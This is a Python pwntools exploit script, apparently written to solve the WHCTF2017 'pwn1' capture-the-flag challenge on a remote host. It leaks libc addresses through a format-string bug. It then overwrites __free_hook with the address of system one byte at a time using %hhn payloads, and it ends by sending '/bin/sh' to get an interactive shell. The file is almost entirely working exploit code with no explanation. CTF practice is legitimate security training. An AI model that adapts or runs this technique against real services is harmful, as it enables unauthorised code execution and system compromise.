#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level='debug'
context.terminal = ['terminator','-x','bash','-c']

DEBUG = 0

if DEBUG:
	cn = process('./pwn1', env={"LD_PRELOAD": "./libc.so.6"})
	gdb.attach(cn)
	
else:
	cn = remote("118.31.10.225", 20001)
e = ELF('./pwn1')
libc = ELF('./libc.so.6')

# init malloc got
cn.recvuntil('Code:')
cn.sendline('2')
cn.recvuntil('Name:\n')
cn.sendline('aaaaa')

cn.recvuntil('Code:')
cn.sendline('1')

cn.recvuntil('WHCTF2017:\n')
# raw_input()
pay = 'a'*1000+'bb%397$p\n%401$p'
pay.ljust(1080,'a')
cn.sendline(pay)
cn.recvuntil('0x')
data = int(cn.recvuntil('\n')[:-1],16)
cn.recvuntil('0x')
binbase = int(cn.recvuntil('\n')[:-1],16)

libc_base = data - libc.symbols['__libc_start_main']-240
success('libc_base: ' + hex(libc_base))
success("main: " + hex(binbase))
# onegadget = 0xf66c0
# onegadget_libc = libc_base + onegadget
free_book = libc_base + libc.symbols["__free_hook"]
system_libc = libc_base + libc.symbols["system"]
# malloc_got = binbase + e.got["free"] - 0xc3c

info("free_book: " + hex(free_book))
info("system_libc: " + hex(system_libc))


# set one bit
cn.recvuntil('Code:')
cn.sendline('1')
cn.recvuntil('WHCTF2017:\n')

one_bit = system_libc & 0xff
one_bit = 0xff & (one_bit - 0xfe)
pay2 = 'a'*1000
pay2 += "cc%{}c%133$hhn".format(one_bit)
pay2 = pay2.ljust(1016, "b")
pay2 += p64(free_book)
cn.send(pay2)

# set two bit
cn.recvuntil('Code:')
cn.sendline('1')
cn.recvuntil('WHCTF2017:\n')

one_bit = (system_libc>>8) & 0xff
one_bit = 0xff & (one_bit - 0xfe)
pay2 = 'a'*1000
pay2 += "cc%{}c%133$hhn".format(one_bit)
pay2 = pay2.ljust(1016, "b")
pay2 += p64(free_book+1)
cn.send(pay2)

# set three bit
cn.recvuntil('Code:')
cn.sendline('1')
cn.recvuntil('WHCTF2017:\n')

one_bit = (system_libc>>16) & 0xff
one_bit = 0xff & (one_bit - 0xfe)
pay2 = 'a'*1000
pay2 += "cc%{}c%133$hhn".format(one_bit)
pay2 = pay2.ljust(1016, "b")
pay2 += p64(free_book+2)
cn.send(pay2)

# set four bit
cn.recvuntil('Code:')
cn.sendline('1')
cn.recvuntil('WHCTF2017:\n')

one_bit = (system_libc>>24) & 0xff
one_bit = 0xff & (one_bit - 0xfe)
pay2 = 'a'*1000
pay2 += "cc%{}c%133$hhn".format(one_bit)
pay2 = pay2.ljust(1016, "b")
pay2 += p64(free_book+3)
cn.send(pay2)

# set five bit
cn.recvuntil('Code:')
cn.sendline('1')
cn.recvuntil('WHCTF2017:\n')

one_bit = (system_libc>>32) & 0xff
one_bit = 0xff & (one_bit - 0xfe)
pay2 = 'a'*1000
pay2 += "cc%{}c%133$hhn".format(one_bit)
pay2 = pay2.ljust(1016, "b")
pay2 += p64(free_book+4)
cn.send(pay2)

# set six bit
cn.recvuntil('Code:')
cn.sendline('1')
cn.recvuntil('WHCTF2017:\n')

one_bit = (system_libc>>40) & 0xff
one_bit = 0xff & (one_bit - 0xfe)
pay2 = 'a'*1000
pay2 += "cc%{}c%133$hhn".format(one_bit)
pay2 = pay2.ljust(1016, "b")
pay2 += p64(free_book+5)
cn.send(pay2)

raw_input()
cn.recvuntil('Code:')
cn.sendline('2')
cn.recvuntil("Name:\n")
cn.sendline("/bin/sh")
cn.recvuntil("Now!")
cn.interactive()